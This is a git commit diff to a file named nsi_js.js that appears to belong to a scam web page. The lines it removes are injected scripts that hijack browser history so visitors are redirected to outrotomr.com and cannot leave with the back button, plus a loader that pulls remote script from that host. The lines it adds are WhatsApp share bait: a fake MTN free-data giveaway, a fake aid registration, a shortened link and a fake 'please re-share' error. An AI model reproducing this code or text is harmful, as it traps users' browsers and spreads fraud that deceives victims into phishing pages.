1fbf41a5fe6c4d0ab5fcb2ec8da751caabf0c33b
saikolaka <146730971+saikolaka@users.noreply.github.com>
2024-01-25 04:26:21 -0800

    Update nsi_js.js

--- nsi_js.js
+++ nsi_js.js
@@ -1,39 +1,9 @@
 
-<script>
-    window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="http://outrotomr.com/4/3144603";
-    }
-    function goon(){
-        location.href="http://outrotomr.com/4/3144603";
-    }
-</script>
-
-
-
-	   <script>
-    window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="http://outrotomr.com/4/3144603;
-    }
-    function goon(){
-        location.href="http://outrotomr.com/4/3144603;
-    }
-</script>
-<script>
-    var _hmt = _hmt || [];
-    (function() {
-        var hm = document.createElement("script");
-        hm.src = "http://outrotomr.com/4/3144603";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-    })();
-</script>
+        var text1 = "*MTN rewards the customers who have been with the network for 1 year and above with 10GB Data free and 1000 minutes talktime free*%0A%0AHurry Now and check if you are Qualify%0A%0ACHECK HERE👇👇%0Ahttps://free-gb-data.org/hilda.html",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://bit.ly/yhauajjdng",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+ 
